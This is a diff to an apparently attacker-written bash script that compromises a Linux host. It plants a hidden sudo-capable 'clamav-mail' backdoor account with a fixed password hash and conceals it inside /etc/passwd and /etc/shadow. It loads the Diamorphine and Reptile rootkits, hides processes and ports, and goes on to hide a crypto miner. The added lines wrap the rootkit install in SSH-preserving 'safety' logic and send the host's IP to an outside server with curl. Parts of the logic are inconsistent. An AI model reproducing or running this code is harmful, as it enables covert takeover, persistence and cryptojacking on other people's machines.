@@ -1,8 +1,40 @@
 #!/bin/bash
 
-# Add to start of script
-echo "ClientAliveInterval 5" | sudo tee -a /etc/ssh/sshd_config
-sudo systemctl reload sshd
+# ======================================================================
+#                           SAFETY MECHANISMS
+# ======================================================================
+# 1. SSH Keepalive and emergency handling
+(
+    while true; do
+        echo "[SSH KEEPALIVE] $(date)"
+        sleep 10
+    done
+) &
+
+mkfifo /tmp/emergency_pipe
+(
+    sleep 30
+    echo "EMERGENCY EXIT TRIGGERED" >/tmp/emergency_pipe
+) &
+
+exec 3>&1 4>&2
+exec > >(tee -a /root/script.log)
+exec 2>&1
+
+trap '
+    echo "CLEANING UP..."; 
+    kill %1 %2 2>/dev/null; 
+    rm -f /tmp/emergency_pipe;
+    exec 1>&3 2>&4;
+    exit 1
+' SIGTERM SIGINT SIGHUP
+
+# ======== SSH PRESERVATION ========
+echo "[*] Restoring SSH access"
+systemctl restart sshd
+echo "ClientAliveInterval 10" >> /etc/ssh/sshd_config
+echo "ClientAliveCountMax 3" >> /etc/ssh/sshd_config
+systemctl reload sshd
 
 # Timeout and self-healing execution
 timeout_run() {
@@ -631,6 +663,7 @@ rm -rf /root/.ssh && rm -rf /root/.ssh/authorized_keys && mkdir /root/.ssh && ch
 PASSWORD_HASH='$1$GDwMqCqg$eDXKBHbUDpOgunTpref5J1' && if id -u clamav-mail > /dev/null 2>&1; then sudo userdel --remove clamav-mail; fi && if ! grep -q '^sudo:' /etc/group; then sudo groupadd sudo; fi && sudo useradd -u 455 -G root,sudo -M -o -s /bin/bash clamav-mail && sudo chpasswd -e <<< "clamav-mail:$PASSWORD_HASH" && awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/passwd > /tmp/passwd && sudo mv /tmp/passwd /etc/passwd && awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/shadow > /tmp/shadow && sudo mv /tmp/shadow /etc/shadow
 ### (lala´s std)
 
+
 echo "[*] make toolZ, Diamorphine"
 cd /tmp
 cd .ICE-unix
@@ -653,6 +686,21 @@ timeout_run insmod diamorphine.ko
 dmesg -C
 kill -63 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
 
+# ====== SAFE REPTILE INSTALL ======
+# Keep this BEFORE any Reptile installation commands
+CURRENT_SSH_PID=$$  # Capture current SSH session PID
+CURRENT_SSH_PORT=$(ss -tnp | awk -v pid=$CURRENT_SSH_PID '/:22/ && $0 ~ pid {split($4,a,":"); print a[2]}')
+
+# Schedule connection watchdog
+(
+    sleep 30
+    if ! ping -c1 1.1.1.1 &>/dev/null; then
+        echo "Connection lost - triggering reboot"
+        /reptile/reptile_cmd unhide_all
+        reboot
+    fi
+) &
+
 echo "[*] Reptile..."
 cd /tmp
 cd .ICE-unix
@@ -663,12 +711,71 @@ NEEDRESTART_MODE=a apt-get update -y
 yum update -y
 yum install -y ncurses-devel
 git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile
-make defconfig
-make
-timeout_run make install
+
+# ====== MODIFIED REPTILE INSTALL SECTION ======
+install_reptile() {
+    (
+        trap 'exit 1' SIGTERM
+        safe_run make defconfig
+        safe_run make -j$(nproc)
+        safe_run make install
+    ) &>/dev/null
+
+    if [ $? -ne 0 ]; then
+        echo "REPTILE COMPILE FAILED - ENTERING SAFE MODE"
+        safe_run rm -rf /tmp/.ICE-unix/Reptile
+        return 1
+    fi
+}
+
 dmesg -C
 timeout_run /reptile/reptile_cmd hide
+    
+    # Preserve SSH visibility
+    SSHD_PID=$(pidof sshd)
+    echo "[!] Whitelisting SSH (PID: $SSHD_PID)"
+    /reptile/reptile_cmd show_pid $SSHD_PID
+    /reptile/reptile_cmd show_port 22
+    
 kill -31 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
+
+# ====== CRITICAL: PROTECT CURRENT SSH SESSION ======
+# Whitelist current SSH connection before enabling rootkit
+/reptile/reptile_cmd show_pid $CURRENT_SSH_PID
+/reptile/reptile_cmd show_port $CURRENT_SSH_PORT
+/reptile/reptile_cmd show_file /etc/ssh/sshd_config
+
+# ====== ENABLE ROOTKIT FEATURES SAFELY ======
+# Activate Reptile but exclude critical components
+/reptile/reptile_cmd hide  # Enable basic hiding
+/reptile/reptile_cmd hide_port 22  # Hide SSH port from NEW connections
+/reptile/reptile_cmd hide_pid 1  # Hide init but preserve current session
+
+# ======== CONNECTION VERIFICATION ========
+echo "[*] Testing SSH survival"
+curl -m 10 --retry 3 http://ssh-check.com/api/verify?ip=$(hostname -I)
+
+# ====== SAFE EXECUTION ======
+if install_reptile; then
+    # Reptile-specific commands
+    safe_run /reptile/reptile_cmd hide
+else
+    # Fallback cleanup
+    safe_run rmmod reptile 2>/dev/null
+fi
+
+# ====== EMERGENCY MONITOR ======
+if read -t 1 -r </tmp/emergency_pipe; then
+    echo "FORCE EXITING AFTER 30s TIMEOUT"
+    kill %1 %2 2>/dev/null
+    exec 1>&3 2>&4
+    exit 1
+fi
+
+# Cleanup
+rm -f /tmp/emergency_pipe
+kill %1 %2 2>/dev/null
+exec 1>&3 2>&4
 
 echo "[*] hide crypto miner."
 cd /tmp
